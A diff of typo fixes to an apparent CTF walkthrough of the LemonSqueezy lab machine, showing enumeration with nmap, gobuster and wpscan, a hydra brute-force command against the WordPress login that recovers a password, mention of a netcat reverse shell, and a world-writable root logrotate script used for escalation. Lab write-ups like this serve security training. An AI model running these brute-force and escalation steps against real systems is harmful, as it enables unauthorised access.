@@ -44,7 +44,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
 ```
 
-The port80 was open which displayed the the Default Apache2 Page. Next, I used Gobuster to search for hidden directories and found two directories named <b>wordpress</b> and <b>phpmyadmin.</b>
+The port80 was open which displayed the Default Apache2 Page. Next, I used Gobuster to search for hidden directories and found two directories named <b>wordpress</b> and <b>phpmyadmin.</b>
 
 ```r
 root@kali:~# gobuster dir -u lemonsqueezy -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
@@ -103,13 +103,13 @@ root@kali:~# wpscan --url http://lemonsqueezy/wordpress/ --enumerate u
 ...
 ```
 
-The next goal was to log into wordpress, I tried some random passwords with the usernames but none of them worked. So the next option was to bruteforce the login. For this, I set up burp proxy and captured the login request.
+The next goal was to log into wordpress, I tried some random passwords with the usernames but none of them worked. So the next option was to brute force the login. For this, I set up a burp proxy and captured the login request.
 
 <center><br>
 <img src="/assets/img/uploads/lemonsqueezy/burp.png">
 </center>
 
-Then I used hydra to bruteforce the login credentials for user <b>orange</b> and found the password <b>ginger.</b>
+Then I used hydra to brute force the login credentials for user <b>orange</b> and found the password <b>ginger.</b>
 ```r
 root@kali:~# hydra lemonsqueezy http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -l orange -P /usr/share/wordlists/rockyou.txt -t 10 -w 30    
 
@@ -154,7 +154,7 @@ The command executed without any errors. Then I went to the location, where the 
 <img src="/assets/img/uploads/lemonsqueezy/backdoor-id.png">
 </center>
 
-That was a success! Now it was time to get a netcat reverse shell back to the host machine and read out first flag!
+That was a success! Now it was time to get a netcat reverse shell back to the host machine and read our first flag!
 
 <center><br>
 <img src="/assets/img/uploads/lemonsqueezy/rev-shell.png">
@@ -201,14 +201,14 @@ pspy64              100%[===================>]   2.94M  --.-KB/s    in 0.04s
 www-data@lemonsqueezy:/dev/shm$ chmod +x pspy64      
 chmod +x pspy64
 ```
-Then I gave it executable permissions and after executing the script, I found a logrotate proccess running as root which repeats itself after some interval.
+Then I gave it executable permissions and after executing the script, I found a logrotate process running as root which repeats itself after some interval.
 
 <center><br>
 <img src="/assets/img/uploads/lemonsqueezy/pspy.png">
 </center>
 
 
-I went to <b>/etc/logrotate.d/</b> directory and found that the <b>logrotate</b> is a python script which is world writeable.
+I went to <b>/etc/logrotate.d/</b> directory and found that the <b>logrotate</b> is a python script which is world writable.
 
 ```r
 www-data@lemonsqueezy:/dev/shm$ cd /etc/logrotate.d/
